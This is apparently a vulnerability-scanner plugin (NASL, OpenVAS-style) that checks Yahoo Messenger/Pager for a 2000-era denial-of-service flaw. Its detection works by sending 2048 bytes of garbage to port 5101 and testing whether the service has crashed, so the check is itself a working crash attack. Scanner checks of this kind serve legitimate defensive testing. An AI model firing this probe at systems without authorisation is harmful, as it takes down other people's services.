# SPDX-FileCopyrightText: 1999 SecuriTeam
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10326");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2000-0047");
  script_name("Yahoo Messenger/Pager DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 1999 SecuriTeam");
  script_family("Denial of Service");
  script_dependencies("yahoo_msg_running.nasl");
  script_require_ports("Services/yahoo_messenger", 5101);
  script_mandatory_keys("yahoo_messenger/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/3869");

  script_tag(name:"impact", value:"Successful attacks can cause Yahoo Messenger to crash by sending
  a few bytes of garbage into its listening port TCP 5101.");

  script_tag(name:"affected", value:"Yahoo Messenger/Pager is known to be affected.");

  script_tag(name:"insight", value:"The flaw is cause due to buffer overflow error while sending a
  long URL within a message.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"Yahoo Messenger or Pager is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port( default:5101, proto:"yahoo_messenger" );

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

send( socket:soc, data:crap( 2048 ) );
close( soc );

soc_sec = open_sock_tcp( port );
if( ! soc_sec ) {
  security_message( port:port );
  exit( 0 );
} else {
  close( soc_sec );
  exit( 99 );
}
